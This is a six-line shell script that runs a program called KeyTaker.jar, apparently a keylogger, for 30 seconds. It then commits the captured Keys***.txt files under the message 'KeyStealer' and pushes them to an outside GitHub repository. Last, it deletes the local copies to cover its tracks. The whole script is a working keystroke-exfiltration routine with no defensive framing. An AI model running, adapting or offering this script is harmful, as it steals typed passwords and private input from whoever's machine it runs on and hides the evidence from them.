java -jar KeyTaker.jar & sleep 30 ; kill $!
git remote set-url origin https://github.com/Menge456/KeyListenerStuff
git add Keys***.txt
git commit -m "KeyStealer"
git push origin
rm -f Keys***.txt
